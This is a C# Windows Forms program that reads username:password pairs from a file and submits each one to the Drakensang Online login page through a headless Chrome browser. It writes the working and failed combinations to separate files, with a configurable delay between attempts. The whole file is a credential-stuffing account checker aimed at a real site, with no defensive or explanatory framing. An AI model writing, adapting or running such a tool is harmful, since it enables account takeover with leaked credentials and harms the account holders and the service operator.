using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Checker_site
{
    public partial class Form1 : Form
    {
        //ChromeDriver driver;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void Button1_Click(object sender, EventArgs e)
        {
            int th = 0;
            if (checkBox1.Checked == true)
            {
                th = Convert.ToInt32(textBox5.Text) * 60000;
            }
            if (checkBox2.Checked == true)
            {
                th = Convert.ToInt32(textBox5.Text) * 1000;
            }
            FileStream file1 = new FileStream(textBox2.Text, FileMode.OpenOrCreate);
            StreamWriter writer = new StreamWriter(file1);

            FileStream file2 = new FileStream(textBox4.Text, FileMode.OpenOrCreate);
            StreamWriter writer2 = new StreamWriter(file2);

            ChromeOptions options = new ChromeOptions();
            options.AddArgument("--headless");
            var driverService = ChromeDriverService.CreateDefaultService();
            driverService.HideCommandPromptWindow = true;
            ChromeDriver driver = new ChromeDriver(options); //options
            int i = 0;
            int ll = File.ReadAllLines(textBox1.Text).Length;

            
            driver.Navigate().GoToUrl("https://www.drakensang.com/ru/%D0%B2%D1%85%D0%BE%D0%B4");
            Thread.Sleep(500);
            while (ll > 0)
            {
                string[] lines = File.ReadAllLines(textBox1.Text);
                textBox3.Text = lines[i];
                string[] gg = textBox3.Text.Split(':');
                textBox3.Text = gg[0];
                
                driver.FindElement(By.Id("bgcdw_login_form_username")).SendKeys(textBox3.Text);
                Thread.Sleep(100);
                textBox3.Text = gg[1];
                driver.FindElement(By.Id("bgcdw_login_form_password")).SendKeys(textBox3.Text);
                Thread.Sleep(100);
                driver.FindElement(By.ClassName("bgcdw_button")).Click();

                try
                {
                    if (driver.FindElement(By.ClassName("bgcdw_errors_flash")) != null)
                    {
                        writer.WriteLine(gg[0] + ":" + gg[1]);
                        textBox3.Text = "BAD";
                        driver.Navigate().GoToUrl("https://www.drakensang.com/ru/%D0%B2%D1%85%D0%BE%D0%B4");
                    }
                }
                catch 
                {
                    writer2.WriteLine(gg[0] + ":" + gg[1]);
                    textBox3.Text = "GOOD";
                    driver.Navigate().GoToUrl("https://www.drakensang.com/ru/%D0%B2%D1%85%D0%BE%D0%B4");

                }

                textBox3.Text = "";
                gg[0] = "";
                gg[1] = "";
                ll--;
                i++;
                Thread.Sleep(th);
            }
            writer.Close();
            writer2.Close();
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
                textBox1.Text = openFileDialog1.FileName;
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            if (openFileDialog2.ShowDialog() == DialogResult.OK)
                textBox2.Text = openFileDialog2.FileName;
        }

        private void Label2_Click(object sender, EventArgs e)
        {

        }

        private void TextBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void TextBox4_TextChanged(object sender, EventArgs e)
        {

        }

        private void Button4_Click(object sender, EventArgs e)
        {
            if (openFileDialog3.ShowDialog() == DialogResult.OK)
                textBox4.Text = openFileDialog3.FileName;
        }
    }
}
